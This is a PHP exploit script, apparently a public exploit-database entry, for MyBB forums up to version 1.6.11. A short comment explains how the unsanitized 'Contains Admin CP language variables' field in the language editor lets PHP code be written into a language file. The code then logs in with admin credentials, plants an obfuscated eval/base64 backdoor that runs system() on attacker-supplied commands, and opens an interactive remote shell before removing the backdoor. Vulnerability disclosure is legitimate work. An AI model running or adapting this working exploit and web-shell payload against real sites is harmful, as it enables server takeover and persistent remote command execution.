<?php

# Exploit Title: MyBB <= 1.6.11 Remote Code Execution Using Admin Privileges
# Date: 30/11/2013
# Exploit Author: BlackDream @ p0wnbox.com
# Google Dork: [if relevant]  (we will automatically add these to the GHDB)
# Exploit Author: BlackDream
# Vendor Homepage: www.mybb.com
# Software Link: http://www.mybb.com/download/latest
# Version: <= 1.6.11
# Tested on: Linux
# Thanks to: UnderSec

/*
Ok guys here we are. In older versions of MyBB it was possible to execute PHP Code by injecting the php code into a template file.
This bug has been fixed in the latest version of MyBB and the code execution is no more possible following this way.

However there is a little bug in the language editor section.

In the Language Editor Section if you go at "Edit Language Pack Properties" of any language you will see an option called "Contains Admin CP language variables? *".
This setting is not being sanitized properly and if we post different data other than 1-0 we can write PHP code in the language file and execute it.


Lets see deeper the code:

File /admin/modules/config/languages.php: Lines 44-49

foreach($mybb->input['info'] as $key => $info)
{
$info = str_replace("\\", "\\\\", $info);
$info = str_replace('$', '\$', $info);
$newlanginfo[$key] = str_replace("\"", '\"', $info);
}

and Line 69:

\$langinfo['admin'] = {$newlanginfo['admin']};


You can see that some chars are being replaced , however MyBB treats the variable $newlanginfo['admin'] as integer. So we can execute PHP code by just
writing the function name on it.


Below is a very simple exploit that does that job for you. Remember that you need the admin credentials to do that.
*/


echo "#######################################################################\n";
echo "#     MyBB <= 1.6.11 Remote Code Execution Using Admin Privileges     #\n";
echo "#                  By BlackDream   @   p0wnbox.com                    #\n";
echo "#######################################################################\n\n";


if ( ! $argc )
{
    exit( "You can't run this script from your browser" );
}
elseif ( $argc != 4 )
{
    die( "Example Usage: php " . basename( __file__ ) . " <mybb_forum> <username> <password>\n\nProvide the myBB forum URL WITHOUT the admin panel directory\n" );
}


$url = $argv[1];
$username = $argv[2];
$password = $argv[3];


//Is this URL A Valid MyBB Forum?
std_echo( "Validate URL...", "*" );
if ( ! ValidateMyBB( $url ) )
{
    std_echo( "Couldn't Validate URL", "-" );
    exit( 1 );
}

//Login
std_echo( "Logging In...", "*" );
if ( ! login( $username, $password ) )
{
    std_echo( "Couldn't Login", "-" );
    exit( 1 );
}


std_echo( "Working...", "*" );

$key = md5( uniqid( rand(), true ) ); //generate a unique key to prevent all the others
$vars_to_post = get_posted_vars( true, $key );
do_backdoor( $vars_to_post );

do
{
    echo "shell(AV: exit)> ";
    $command = get_input();
    $command_enc = base64_encode( $command );
    
    echo file_get_contents( $url . "/inc/languages/english.php?key=$key&exploited=$command_enc" );
} while ( $command != "exit" );

//remove our backdoor
$vars_to_post = get_posted_vars( false );
do_backdoor( $vars_to_post );


function get_input(  )
{
    $input = trim( fgets( STDIN, 255 ) );
    return $input;
}
function do_backdoor( $vars_to_post )
{
    global $url;

    $ch = curl_init();

    curl_setopt( $ch, CURLOPT_URL, $url . '/admin/index.php?module=config-languages&action=edit_properties' );
    curl_setopt( $ch, CURLOPT_POST, 1 );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $vars_to_post ) );
    curl_setopt( $ch, CURLOPT_COOKIEFILE, 'cookie.txt' );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    $source = curl_exec( $ch );

}

function get_posted_vars( $do_backdoor, $key = '' )
{
    global $url;

    $ch = curl_init();

    curl_setopt( $ch, CURLOPT_URL, $url . '/admin/index.php?module=config-languages&action=edit_properties&lang=english' );

    curl_setopt( $ch, CURLOPT_COOKIEFILE, 'cookie.txt' );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    $source = curl_exec( $ch );

    $vars_to_post = array();

    if ( preg_match( "/<input type=\"hidden\" name=\"my_post_key\" value=\"(.*?)\" \/>/", $source, $matches ) )
    {
        $vars_to_post['my_post_key'] = $matches[1];
        $vars_to_post['lang'] = "english";
        $vars_to_post['info[author]'] = "MyBulletinBoard";
        $vars_to_post['info[website]'] = "http://www.mybb.com";
        $vars_to_post['info[author]'] = "MyBulletinBoard";
        $vars_to_post['info[version]'] = "1610";
        $vars_to_post['info[name]'] = "English (American)";
        $vars_to_post['info[htmllang]'] = "en";
        $vars_to_post['info[charset]'] = "UTF-8";
        $vars_to_post['info[rtl]'] = "0";
        $vars_to_post['info[admin]'] = 1;
        //generating UNIQUE MD5
        if ( $do_backdoor )
        {
            $payload = 'if(isset($_GET["exploited"]) && $_GET["key"] == "' . $key . '") { system(base64_decode($_GET["exploited"])); }';
            $payload = base64_encode( $payload );
            $vars_to_post['info[admin]'] = "eval(base64_decode('$payload'))";
        }

        return $vars_to_post;
    }

    return false;
}

function login( $username, $password )
{
    global $url;

    $ch = curl_init();

    curl_setopt( $ch, CURLOPT_URL, $url . "/admin/index.php" );
    curl_setopt( $ch, CURLOPT_POST, 1 );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, 'username=' . $username . '&password=' . $password . "&do=login" );
    curl_setopt( $ch, CURLOPT_COOKIEJAR, 'cookie.txt' );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    $source = curl_exec( $ch );

    return strpos( $source, 'Logged in as' );

}
function ValidateMyBB( $url )
{
    $source = @file_get_contents( $url . "/admin/" );
    if ( $source )
    {
        return stripos( $source, "MyBB Control Panel" );
    }
    return false;
}

function std_echo( $message, $ch )
{
    echo "[$ch] $message\n";
}

?>